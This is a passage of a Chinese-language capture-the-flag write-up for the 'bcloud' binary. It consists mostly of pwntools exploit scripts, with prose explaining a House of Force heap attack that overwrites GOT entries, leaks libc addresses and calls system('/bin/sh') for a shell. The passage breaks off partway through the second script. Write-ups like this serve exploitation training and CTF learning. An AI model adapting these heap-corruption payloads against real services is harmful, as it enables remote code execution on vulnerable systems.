      r.recvuntil("Input the length of the note content:")
      r.sendline(str(size))
      r.recvuntil("Input the content:")
      r.send(content)
    def new_hj(size):
      r.recvuntil("option--->>")
      r.sendline("1")
      r.recvuntil("Input the length of the note content:")
      r.sendline(str(size))
    def edit(idx,content):
      r.recvuntil("option--->>")
      r.sendline("3")
      r.recvuntil("Input the id:")
      r.sendline(str(idx))
      r.recvuntil("Input the new content:")
      r.send(content)
    def delet(idx):
      r.recvuntil("option--->>")
      r.sendline("4")
      r.recvuntil("Input the id:")
      r.sendline(str(idx))
    #MAIN EXPLOIT
    #leak heap addr
    r.recvuntil("Input your name:")
    r.send('N' * 0x40)
    r.recvuntil('Hey ' + 'N'*0x40)
    _heap_addr = r.recv(4)
    heap_addr = u32(_heap_addr) - 8 #due to being the first chunk, heap_addr is just the heap base
    print(hex(heap_addr))
    #overflow the top chunk
    r.recvuntil("Org:")
    r.send('A' * 0x40)
    r.recvuntil("Host:")
    r.sendline(p32(0xffffffff))
    #top chunk hijack
    #hijack for libc_base leak
    malloc_got = 0x804B020
    fake_topchunk_head = malloc_got - 0x08
    raw_topchunk_head = heap_addr + (0x48 * 3)
    offset = fake_topchunk_head - raw_topchunk_head - 0x08
    lenth_input = offset - 4
    new_hj(lenth_input) #idx.0, top chunk pointing where we need
    #raw_input("#debug1")
    #call new to hijack malloc_got->leak_echo & puts_got->printf_plt
    payload_lkhj = p32(0x8048779) + p32(0x80484d0) + p32(0) + p32(0x8048ab7)# + '/bin/shx00'
    new(len(payload_lkhj),payload_lkhj) #idx.1
    #call new to leak printf_got, then we can calculate out system_addr & /bin/sh, even onegadget
    printf_got = 0x804b010
    len_ipt = printf_got - 4
    raw_input("#debug21")
    new_hj(len_ipt)#################################
    #raw_input("#debug22")
    r.recvuntil("Hey ")
    _printf_got = r.recv(4)
    printf_got = u32(_printf_got)
    print(hex(printf_got))
    libc_base = printf_got - 0x49670
    onegadget = libc_base + 0x4526a
    print(hex(libc_base))
    print(hex(onegadget))
    print(r.recvuntil("Input the content:"))
    #s = ' '
    #print("###" + s.strip())
    #r.send(b'xff')
    r.interactive()
    #p = " "
    #_p = p.strip()
    #r.send(_p)
    #r.send(p32(0xffffffff))
    raw_input("dddddd")
    r.recvuntil("Input the id:")
    r.sendline(str(1))
    r.recvuntil("Input the new content:")
    payload_shell = p32(0) + p32(onegadget)
    r.sendline(payload_shell)
    r.interactive()
按思路运行到这里就应该手输ctrl + d了，可以看到泄露地址是正确的。
### 换思路：
以上思路行不通，我们还是换思路吧。
首先我们还是要泄露内存，没有自带的打印功能，我们还是得篡改某个库函数got表为leak_echo函数，而且这个被篡改的库函数的参数我们还得能控制，而篡改malloc_got的下场上面我们已经见识过了，那么在仅有的这几个可怜的libc函数中，有可能我们能控制其参数的也就只有free函数了，它在delet函数中：
    int delet()
    {
    int idx; // [esp+18h] [ebp-10h]
    void *ptr; // [esp+1Ch] [ebp-Ch]
    puts("Input the id:");
    idx = input_a_number();
    if ( idx  9 )
    return puts("Invalid ID.");
    ptr = (void *)idx_table_bss[idx];
    if ( !ptr )
    return puts("Note has been deleted.");
    idx_table_bss[idx] = 0;
    lenth_table_bss[idx] = 0;
    free(ptr);
    return puts("Delete success.");
    }
可见free如果被劫持，执行完了以后就直接return了，不会有像new函数中那么多破事儿，而且其参数是ptr，也就是idx_table_bss[idx]，也就是说如果我们能控制idx_table_bss[idx]的值，就可以控制参数了，显然正常情况下这个值不能由我们控制，必须通过hof劫持idx_table_bss才行；另一边，如何篡改free_got呢？巧了，如果我们控制了idx_table_bss，那么在执行edit的时候，不就想写哪就写哪了吗！一举两得，思路正是hof劫持idx_table_bss！
我们将idx_table_bss的前几项依次部署为：
  * Free_got
  * Printf_got
  * &idx_table_bss[3]
  * “/bin”
  * “/shx00”
我们则可以先edit(0)将free_got篡改为leak_echo函数，然后delet(1)将以idx_table_bss[1]即printf_got为free（现已为leak_echo）的参数，调用leak_echo泄露出printf地址并进一步计算出system_addr，再重复第一步的edit(0)将free_got再篡改为system地址，然后再执行delet(2)，将以&idx_table_bss[3]即”/bin/shx00″字符串的地址为free（现已为system）的参数，调用system拿到shell！
注意：第一次new的时候我们是把top
chunk劫持到了idx_table_bss，此时lenth_table_bss[0]处就已经被赋值了，我们第二次new的时候才来向idx_table_bss写内容部署如上，此时写入的部署内容的长度是被写入到lenth_table_bss[1]的，但是我们edit(0)的时候用的却是lenth_table_bss[0]记录的长度，也就是当初hof时输入的负数值，因此传入edit中name_input函数的lenth参数由于是负数便不进for循环，也便没能正常read我们的部署内容，因此此处实际应当edit(1)才是，edit(1)时用的是lenth_table_bss[1]，这个长度值没毛病，所以对应的，我们idx_table_bss前几项的部署内容应该是：
  * p32(0)
  * Free_got
  * Printf_got
  * &idx_table_bss[3]
  * “/bin”
  * “/shx00”
对应操作步骤也相应变成了：edit(1)，delet(2)，再edit(1)，然后再delet(3)get shell。
给出exp：
    from pwn import *
    #ARCH SETTING
    context(arch = 'i386' , os = 'linux')
    r = process('./bcloud')
    #r = remote('127.0.0.1',9999)
    #FUNCTION DEFINE
    def new(size,content):
      r.recvuntil("option--->>")
      r.sendline("1")
      r.recvuntil("Input the length of the note content:")
      r.sendline(str(size))
      r.recvuntil("Input the content:")
      r.send(content)
    def new_hj(size):
      r.recvuntil("option--->>")
      r.sendline("1")
      r.recvuntil("Input the length of the note content:")
      r.sendline(str(size))
    def edit(idx,content):
      r.recvuntil("option--->>")
      r.sendline("3")
      r.recvuntil("Input the id:")
      r.sendline(str(idx))
      r.recvuntil("Input the new content:")